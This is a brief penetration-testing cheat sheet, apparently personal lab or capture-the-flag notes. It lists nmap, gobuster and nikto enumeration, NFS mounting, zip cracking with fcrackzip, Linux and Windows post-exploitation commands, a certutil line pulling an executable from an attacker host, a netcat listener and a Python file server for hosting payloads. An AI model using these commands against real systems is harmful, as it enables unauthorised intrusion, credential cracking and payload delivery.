## Enumeration 
arp-scan -l

showmount -e [server ip]

mount -t nfs [server ip]:[remote path shown from showmount] [to local mount point]

nmap -sV -A -T4 -p- 

nmap -sV -A -T4 --top-ports 500 [IpAddress]

nmap --sC ? 

gobuster ######

## Web Enumeration

Curl -I http://[WebsiteORip]

nikto -h http://[IPaddress:8080]

## Cracking
Zip files: fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt [target.zip]

## Linux Post Exploitation
history

pwd

sudo -l

crontab -l

**Linux wget and curl commands**

## Windows Post Exploitation
cd

whoami

ipconfig

dir

sc stop [application]

sc start [application]

sc query [application]

certutil.exe -urlcache -f http://[attackerip]:8000/[application.exe] [applicationname.exe]

## Listener
nc -nlvp [port]

## Directory hosting
python -m SimpleHTTPServer



